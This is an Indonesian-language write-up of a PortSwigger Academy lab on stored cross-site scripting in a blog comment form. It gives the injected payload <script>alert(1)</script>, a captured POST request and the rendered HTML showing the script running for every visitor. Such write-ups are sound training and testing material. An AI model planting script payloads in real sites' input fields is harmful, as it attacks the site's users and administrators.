# [PortSwigger Academy] Cross-Site Scripting - Lab #2

## 📌 Detail Lab
* **Nama Tantangan:** Stored XSS into HTML context with nothing encoded
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** Cross-Site Scripting (XSS) - Stored
* **Tujuan Lab:** Menemukan celah Stored XSS pada fitur komentar blog dan menyimpan payload JavaScript secara permanen untuk memicu fungsi `alert()`.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah ini ditemukan pada formulir komentar postingan blog (`/post/comment`). Aplikasi menerima input teks komentar dari pengguna, menyimpannya ke dalam database, lalu merendernya kembali ke dalam halaman HTML postingan agar bisa dibaca oleh pengunjung lain.

Karena aplikasi tidak melakukan validasi, penyaringan, ataupun *HTML-encoding* terhadap karakter khusus pada kolom komentar, input berbahaya berupa tag `<script>` akan disimpan mentah-mentah ke database dan dieksekusi oleh browser setiap kali halaman postingan tersebut dimuat.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Pengujian Input Form Komentar
Buka salah satu artikel blog, lalu isi formulir komentar dengan data uji coba dan masukkan payload JavaScript pada bagian area teks komentar (*Comment box*):

* **Komentar (Payload):** `<script>alert(1)</script>`
* **Name:** `Attacker`
* **Email:** `attacker@test.com`
* **Website:** `http://test.com`

Kirim komentar tersebut (*Submit comment*).

### Request HTTP di Backend
Proses pengiriman data melalui request POST terlihat seperti berikut pada Burp Suite:
```http
POST /post/comment HTTP/2
Host: 0a0000c1044224608369beb0007b00cb.web-security-academy.net
Content-Length: 180

csrf=pulJCRE0RNMqvW3SBpVMavJxPI8Y9U8W&postId=2&comment=sdsdsdsdsd&name=attacker&email=attacker%40gmail.com&website=https%3A%2F%2Fwebhook.site%2Fad0b8606-93a1-45de-921f-366f5fe498e4
```

### Hasil Eksekusi dan Dampak Persisten
Kembali ke halaman postingan blog tadi. Ketika browser memuat ulang artikel, data komentar ditarik dari database backend dan dirender langsung ke dalam struktur DOM HTML:
```
<p><script>alert(1)</script></p>
```
Hasil Akhir: Browser membaca teks tersebut sebagai skrip instruksi aktif, sehingga kotak dialog pop-up alert(1) langsung muncul. Karena payload ini tersimpan di database, efek pop-up ini akan terus muncul bagi siapa saja (termasuk admin atau pengunjung lain) yang membuka link artikel tersebut. Lab berhasil diselesaikan (Solved).